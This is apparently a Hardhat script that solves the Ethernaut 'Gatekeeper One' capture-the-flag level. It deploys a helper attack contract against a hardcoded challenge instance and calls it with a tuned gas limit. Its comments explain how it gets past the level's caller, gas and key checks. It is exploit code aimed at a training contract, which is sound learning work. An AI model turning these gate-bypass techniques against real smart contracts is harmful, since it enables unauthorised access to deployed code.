const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x6696bb338c2c7c8bd95C262C474ED612f99f4374'
const abi = [
    "function enter(bytes8 _gateKey) public returns (bool)",
    "function entrant() public view returns (address)"
]

async function hack(contract, signer) {
    // We need to deploy a contract to break in for us, so that we meet the conditions of Gate One.
    const GatebreakerOne = await ethers.getContractFactory('GatebreakerOne')
    const gatebreakerOne = await GatebreakerOne.deploy(contract.address)
    await gatebreakerOne.deployed()
    console.log(`GatebreakerOne Deployed To: ${gatebreakerOne.address}`)

    // Gate Three: In the contract, calculate the uint16 of msg.sender, and then add any multiple of 2 > 2 ^ 16 (impacts uint64 but not uint32) to meet the criteria.
    // Gate Two: Plug the function into Remix, set the compiler version to match your instance, and step through the debugger to find a gas amt that meets the criteria.
    const gasToUse = 58822;
    const gatebreakerABI = ["function breakIn() public"]
    const gatebreaker = new ethers.Contract(gatebreakerOne.address, gatebreakerABI, signer)
    const tx = await gatebreaker.breakIn({ gasLimit: gasToUse })
    await tx.wait()
    
    // Confirm that everything worked.
    const entrant = await contract.entrant()
    console.log(`Entrant: ${entrant}`)
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})